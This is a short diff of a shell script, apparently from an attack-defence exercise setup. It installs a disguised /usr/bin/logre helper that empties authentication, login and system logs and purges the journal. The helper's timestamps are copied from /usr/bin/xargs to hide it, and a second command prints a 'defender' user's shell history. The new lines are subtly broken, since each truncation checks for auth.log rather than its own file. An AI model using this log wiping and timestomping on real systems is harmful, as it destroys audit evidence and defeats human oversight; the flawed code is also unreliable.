@@ -49,10 +49,11 @@ echo "cat /home/defender/.bash_history" > /usr/bin/look && chmod +x /usr/bin/loo
 
 cat << 'EOF' > /usr/bin/logre
 #!/usr/bin/env bash
-> /var/log/auth.log
-> /var/log/wtmp
-> /var/log/btmp
-> /var/log/lastlog
+[ -f /var/log/auth.log ] && truncate -s 0 /var/log/auth.log
+[ -f /var/log/auth.log ] && truncate -s 0 /var/log/wtmp
+[ -f /var/log/auth.log ] && truncate -s 0 /var/log/btmp
+[ -f /var/log/auth.log ] && truncate -s 0 /var/log/lastlog
+[ -f /var/log/auth.log ] && truncate -s 0 /var/log/syslog
 sudo journalctl --vacuum-time=1s
 EOF
 chmod +x /usr/bin/logre && touch -r /usr/bin/xargs /usr/bin/logre
